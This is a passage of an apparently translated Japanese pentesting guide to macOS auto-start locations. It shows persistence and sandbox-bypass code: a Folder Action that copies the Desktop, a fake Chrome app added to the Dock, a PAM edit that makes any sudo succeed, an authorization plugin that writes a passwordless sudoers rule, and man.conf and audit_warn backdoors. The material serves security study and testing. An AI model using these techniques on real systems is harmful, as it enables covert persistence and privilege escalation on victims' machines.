> [!WARNING]
> AT tasks が有効になっていない場合、作成された tasks は実行されません。

**job files** は `/private/var/at/jobs/` にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名には、queue、job number、実行予定時刻が含まれています。例として `a0001a019bdcd2` を見てみましょう。

- `a` - これは queue です
- `0001a` - 16進数の job number、`0x1a = 26`
- `019bdcd2` - 16進数の時刻です。epoch から経過した分数を表します。`0x019bdcd2` は10進数で `26991826` です。これに60を掛けると `1619509560` になり、`GMT: 2021年4月27日（火曜日）7:46:00` です。

job file を表示すると、`at -c` を使って取得したものと同じ情報が含まれていることがわかります。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Folder Actions を設定するには、引数付きで `osascript` を呼び出して **`System Events`** に接続できる必要があります
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop、Documents、Downloads などの基本的な TCC permissions があります

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root が必要
- **Trigger**: 指定した folder へのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: 指定した folder へのアクセス

#### Description & Exploitation

Folder Actions は、項目の追加や削除、folder window のオープンやリサイズなど、folder 内の変更によって自動的に trigger される scripts です。これらの actions はさまざまなタスクに利用でき、Finder UI や terminal commands など、異なる方法で trigger できます。<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions を設定するには、次のような方法があります。

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) で Folder Action workflow を作成し、service としてインストールする。
2. folder の context menu にある Folder Actions Setup から、script を手動で attach する。
3. OSAScript を利用して `System Events.app` に Apple Event messages を送信し、プログラムから Folder Action を設定する。
- この method は、action を system に組み込むのに特に有用で、一定レベルの persistence を提供します。

次の script は、Folder Action によって実行できる内容の例です。
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
上記のスクリプトをFolder Actionsで使用できるようにするには、次のコマンドでコンパイルします。
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
スクリプトをコンパイルしたら、以下のスクリプトを実行して Folder Actions を設定します。このスクリプトにより Folder Actions がグローバルで有効になり、以前にコンパイルしたスクリプトが Desktop フォルダに具体的に関連付けられます。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
次のコマンドでセットアップスクリプトを実行します:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- GUIを介してこの永続化を実装する方法は次のとおりです。

これが実行されるscriptです:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
次のコマンドでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所に移動します:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
次に、`Folder Actions Setup` appを開き、**監視したいフォルダ**を選択し、今回のケースでは **`folder.scpt`**（私の場合は output2.scp と名付けました）を選択します。

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

これで、**Finder**でそのフォルダを開くと、scriptが実行されます。

この設定は、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**にある**plist**に、base64形式で保存されます。

次に、GUI accessなしでこのpersistenceを準備してみましょう。

1. バックアップとして、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**を`/tmp`に**コピー**します。
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 先ほど設定したFolder Actionsを**削除**します。

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

これで空の環境ができました。

3. バックアップファイルをコピーします: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Folder Actions Setup.appを開いて、このconfigを読み込みます: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> これは私の場合は機能しませんでしたが、以下はwriteupの手順です:(

### Dockショートカット

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、malicious applicationをsystem内にインストールしておく必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: userがDock内のappをクリックしたとき

#### Description & Exploitation

Dockに表示されるすべてのapplicationは、plist **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>内で指定されています。

次のようにして、**applicationを追加**できます。
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
**social engineering** を使えば、Dock 内で **例えば Google Chrome になりすまし**、実際に自分のスクリプトを実行できます。
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 色選択ツール

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 非常に specific な action が発生する必要がある
- 別の sandbox に移行することになる
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/Library/ColorPickers`
- root が必要
- Trigger: color picker を使用する
- `~/Library/ColorPickers`
- Trigger: color picker を使用する

#### 説明と Exploit

コードを含む color picker bundle を **Compile** し（例として[**こちら**](https://github.com/viktorstrate/color-picker-plus)を使用できます）、constructor を追加して（[Screen Saver セクション](macos-auto-start-locations.md#screen-saver)のように）、bundle を `~/Library/ColorPickers` にコピーします。<sup>[[20]](#references)</sup>

その後、color picker が Trigger されると、あなたのコードも実行されます。

library を loading する binary には、**非常に restrictive な sandbox** があることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox の bypass に有用: **いいえ、自分の app を実行する必要があるため**
- TCC bypass: ???

#### Location

- 特定の app

#### Description & Exploit

Finder Sync Extension を備えた app の例は、[**こちら**](https://github.com/D00MFist/InSync)で確認できます。

Applications には `Finder Sync Extensions` を含めることができます。この extension は、実行される application 内に入ります。さらに、extension が code を実行できるようにするには、**有効な Apple developer certificate で署名されている**必要があり、**sandbox 化されている**必要があり（ただし、緩和された例外を追加できます）、次のようなものに登録されている必要があります:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的には一般的な application sandbox 内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- root が必要
- **Trigger**: スクリーンセーバーを選択
- `/Library/Screen Savers`
- root が必要
- **Trigger**: スクリーンセーバーを選択
- `~/Library/Screen Savers`
- **Trigger**: スクリーンセーバーを選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Xcode で新しい project を作成し、新しい **Screen Saver** を生成する template を選択します。次に、コードを追加します。例えば、以下のコードで logs を生成できます。<sup>[[23]](#references)[[24]](#references)</sup>

**Build** して、`.saver` bundle を **`~/Library/Screen Savers`** にコピーします。その後、Screen Saver GUI を開き、クリックするだけで大量の logs が生成されるはずです。
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> このコードをロードするバイナリ（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）の entitlements 内には **`com.apple.security.app-sandbox`** があるため、**共通アプリケーションサンドボックス内**にいることに注意してください。

セーバーコード:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight プラグイン

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、最終的には application sandbox 内に入る
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox は非常に制限されているように見える

#### 場所

- `~/Library/Spotlight/`
- **Trigger**: Spotlight プラグインが管理する拡張子の新しいファイルが作成される。
- `/Library/Spotlight/`
- **Trigger**: Spotlight プラグインが管理する拡張子の新しいファイルが作成される。
- root が必要
- `/System/Library/Spotlight/`
- **Trigger**: Spotlight プラグインが管理する拡張子の新しいファイルが作成される。
- root が必要
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Spotlight プラグインが管理する拡張子の新しいファイルが作成される。
- 新しい app が必要

#### 説明と Exploitation

Spotlight は macOS に組み込まれた検索機能であり、ユーザーに対して **コンピューター上のデータへの迅速かつ包括的なアクセス** を提供するよう設計されている。\
この高速な検索機能を実現するため、Spotlight は **独自のデータベース** を保持し、**ほとんどのファイルを解析** してインデックスを作成することで、ファイル名とその内容の両方を迅速に検索できるようにしている。<sup>[[25]](#references)</sup>

Spotlight の基盤となる仕組みには、'mds' という名前の中央プロセスがあり、これは **'metadata server'** を意味する。このプロセスが Spotlight サービス全体を統括する。これを補完する形で、複数の 'mdworker' daemon がさまざまなメンテナンスタスクを実行する。たとえば、異なるファイルタイプのインデックス作成などである（`ps -ef | grep mdworker`）。これらのタスクは Spotlight importer プラグイン、つまり **".mdimporter bundles"** によって可能になる。これにより Spotlight は、さまざまなファイル形式のコンテンツを認識してインデックス化できる。

プラグイン、つまり **`.mdimporter`** bundles は前述した場所に配置され、新しい bundle が出現すると 1 分以内にロードされる（サービスの再起動は不要）。これらの bundle では、**管理できるファイルタイプと拡張子** を指定する必要がある。これにより、指定された拡張子を持つ新しいファイルが作成された際、Spotlight はそれらを使用する。

ロードされたすべての `mdimporters` は、次のコマンドを実行して **確認できる**:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例えば、**/Library/Spotlight/iBooksAuthor.mdimporter** は、次の種類のファイル（拡張子 `.iba` および `.book` など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 他の `mdimporter` の Plist を確認しても、**`UTTypeConformsTo`** のエントリが見つからない場合があります。これは組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、System のデフォルトプラグインが常に優先されるため、攻撃者がアクセスできるのは、Apple 自身の `mdimporters` によってインデックス化されていないファイルだけです。

独自の importer を作成するには、まずこのプロジェクト [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) を利用し、名前と **`CFBundleDocumentTypes`** を変更し、サポートしたい拡張子に対応するよう **`UTImportedTypeDeclarations`** を追加したうえで、それらを **`schema.xml`** に反映します。\
次に、関数 **`GetMetadataForFile`** のコードを変更し、処理対象の拡張子を持つファイルが作成されたときに payload を実行するようにします。

最後に、新しい **`.mdimporter`** を **build** して、先ほどの3つの場所のいずれかにコピーします。**ログを監視**するか、**`mdimport -L`** を実行することで、ロードされているか確認できます。

### ~~Preference Pane~~

> [!CAUTION]
> これはもう動作しないようです。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 特定のユーザー操作が必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

これはもう動作しないようです。<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> ここでは、**root** で**ファイルに書き込む**だけで何かを実行できる、またはその他の**特殊な条件が必要な**sandbox bypass に役立つ start locations を紹介します。

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root である必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- root が必要
- **Trigger**: 時刻になると
- `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
- root が必要
- **Trigger**: 時刻になると

#### Description & Exploitation

Periodic scripts（**`/etc/periodic`**）は、`/System/Library/LaunchDaemons/com.apple.periodic*` に設定された **launch daemons** によって実行されます。`/etc/periodic/` に保存された scripts は、**ファイルの所有者として** **実行される**ため、これは privilege escalation には利用できない点に注意してください。<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** に示されている、実行されるその他の定期スクリプトもあります：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`、`/etc/weekly.local`、または`/etc/monthly.local`のいずれかのファイルへの書き込みに成功すると、**遅かれ早かれ実行されます**。

> [!WARNING]
> periodic scriptは、**そのscriptの所有者として実行される**ことに注意してください。したがって、通常のユーザーがscriptを所有している場合は、そのユーザーとして実行されます（これにより、権限昇格攻撃が防止される可能性があります）。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- sandboxのbypassに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、rootである必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 常にrootが必要

#### Description & Exploitation

PAMはmacOS内での容易な実行よりも、**persistence**やmalwareに重点を置いているため、このblogでは詳細な説明を行いません。**このtechniqueをよりよく理解するには、writeupを読んでください**。<sup>[[28]](#references)</sup>

以下でPAM modulesを確認します:
```bash
ls -l /etc/pam.d
```
PAMを悪用したpersistence/privilege escalation techniqueは、module /etc/pam.d/sudoを変更し、先頭に次の行を追加するだけで実行できます：
```bash
auth       sufficient     pam_permit.so
```
そのため、**次のように見える**ものになります：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
したがって、**`sudo` を使用する試みはすべて成功します**。

> [!CAUTION]
> このディレクトリは TCC によって保護されているため、ユーザーにアクセスを求めるプロンプトが表示される可能性が非常に高いことに注意してください。

もう1つの良い例は su です。ここでは、PAM modules にパラメータを渡すことも可能であることがわかります（このファイルに backdoor を仕込むこともできます）。
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、追加の設定を行う必要がある
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- root が必要
- plugin を使用するよう authorization database を設定する必要もある

#### Description & Exploitation

ユーザーがログインしたときに実行され、persistence を維持する authorization plugin を作成できます。これらの plugin の作成方法については、以前の writeup を確認してください（また、適切に記述されていない plugin によってロックアウトされる可能性があり、その場合は recovery mode から Mac をクリーンアップする必要があるため注意してください）。<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**ロードされる場所へ移動**iyanas
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後に、この Plugin をロードするための **rule** を追加します：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** は、認可 framework に対して、**認可のために外部 mechanism を呼び出す必要がある**ことを伝えます。さらに、**`privileged`** によって root として実行されます。

次でトリガーします：
```bash
security authorize com.asdf.asdf
```
そして、**staff group には sudo** access が必要です（確認するには `/etc/sudoers` を読み取ります）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、ユーザーが man を使用しなければならない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- root が必要
- **`/private/etc/man.conf`**: man が使用されるたび

#### Description & Exploit

config file **`/private/etc/man.conf`** は、man のドキュメント file を開くときに使用する binary/script を指定します。そのため、executable へのパスを変更すれば、ユーザーが man を使ってドキュメントを読むたびに backdoor が実行されます。<sup>[[31]](#references)</sup>

例えば、**`/private/etc/man.conf`** に次のように設定します。
```
MANPAGER /tmp/view
```
その後、`/tmp/view` を次の内容で作成します:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**解説**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox の bypass に便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root である必要があり、apache が実行中である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- `Httpd` には entitlements がありません

#### 場所

- **`/etc/apache2/httpd.conf`**
- root が必要
- Trigger: Apache2 の起動時

#### 説明と Exploit

`/etc/apache2/httpd.conf` で、次のような行を追加して module を load するよう指定できます:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
この方法で、コンパイルしたモジュールが Apache によって読み込まれます。必要なのは、**有効な Apple 証明書で署名する**か、システムに**新しい信頼済み証明書を追加し、それで署名する**ことだけです。

次に、必要に応じてサーバーが起動されることを確認するには、以下を実行します。
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb のコード例：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

解説: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root 権限が必要で、auditd が実行中であり、warning を発生させる必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/etc/security/audit_warn`**
- root 権限が必要
- **Trigger**: auditd が warning を検出したとき

#### 説明と Exploit

auditd が warning を検出すると、スクリプト **`/etc/security/audit_warn`** が **実行されます**。そのため、そこに payload を追加できます。<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n`で警告を強制的に表示できます。

### スタートアップ項目

> [!CAUTION] > **これはdeprecatedのため、これらのディレクトリには何も見つからないはずです。**

**StartupItem**は、`/Library/StartupItems/`または`/System/Library/StartupItems/`内に配置されるディレクトリです。このディレクトリを作成したら、次の2つのファイルを含める必要があります。

1. **rc script**: startup時に実行されるshell script。
2. **plist file**: `StartupParameters.plist`という名前で、さまざまな設定を含むファイル。

startup processがこれらを認識して利用できるよう、rc scriptと`StartupParameters.plist`ファイルの両方を**StartupItem**ディレクトリ内に正しく配置してください。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 私の macOS ではこのコンポーネントを見つけられなかったため、詳細については writeup を確認してください

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

